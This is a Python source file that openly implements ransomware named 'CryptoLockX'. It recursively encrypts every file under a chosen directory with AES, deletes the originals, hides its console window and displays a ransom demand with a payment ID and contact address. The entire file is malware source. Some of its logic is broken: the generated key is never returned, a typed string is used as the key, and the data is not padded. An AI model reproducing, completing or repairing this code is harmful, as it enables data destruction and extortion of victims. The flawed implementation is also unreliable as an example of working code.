import os
import sys
import subprocess
import ctypes
import tkinter as tk
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Hide the console window to execute the ransomware silently
def hide_console_window():
    if os.name == "nt":  # For Windows
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    elif os.name == "posix":  # For Unix-based systems
        subprocess.Popen(["/bin/sh", "-c", "exec nohup python3 {} &> /dev/null &".format(sys.argv[0])])

# Generate a unique encryption key using a password-based key derivation function (PBKDF)
def generate_key():
    password = os.urandom(16)  # Generate a random password
    salt = os.urandom(16)  # Generate a random salt
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,  # Adjust the number of iterations for desired security level
        backend=default_backend()
    )
    key = kdf.derive(password)
    # Store the key securely (you may want to encrypt it with a master key)
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

# Encrypt files with the generated key
def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    # Generate a random initialization vector (IV)
    iv = os.urandom(16)
    # Use AES encryption algorithm in CBC mode
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    # Encrypt the data
    encrypted_data = encryptor.update(data) + encryptor.finalize()
    # Store the IV along with the encrypted data
    with open(file_path + ".encrypted", "wb") as encrypted_file:
        encrypted_file.write(iv + encrypted_data)
    os.remove(file_path)

# Display ransom message with payment instructions using Tkinter GUI
def display_ransom_gui(payment_id):
    root = tk.Tk()
    root.title("CryptoLockX Ransomware")
    root.geometry("400x200")

    label = tk.Label(root, text="Your files have been encrypted by CryptoLockX.", font=("Helvetica", 14))
    label.pack(pady=10)

    label2 = tk.Label(root, text="To decrypt your files, you must pay a ransom in cryptocurrency.", font=("Helvetica", 12))
    label2.pack()

    label3 = tk.Label(root, text="Contact cryptolockx@example.com for payment instructions.", font=("Helvetica", 12))
    label3.pack()

    label4 = tk.Label(root, text="Your unique payment ID is: {}".format(payment_id), font=("Helvetica", 12))
    label4.pack()

    root.mainloop()

# Track payments made by victims
def track_payments(payment_id):
    # Implement payment tracking logic here
    # You may want to store payment information in a database or log file
    print("Tracking payment for ID: {}".format(payment_id))
    print("Payment received. Decrypting files...")

# Main function to execute the ransomware
def main():
    generate_key()
    key = input("Enter the encryption key: ")
    directory_path = input("Enter the directory to encrypt: ")
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
    payment_id = "ABC123"  # Generate a unique payment ID for each victim
    hide_console_window()  # Hide the console window before executing
    display_ransom_gui(payment_id)
    payment_confirmation = input("Have you made the payment? (yes/no): ")
    if payment_confirmation.lower() == "yes":
        track_payments(payment_id)

if __name__ == "__main__":
    main()
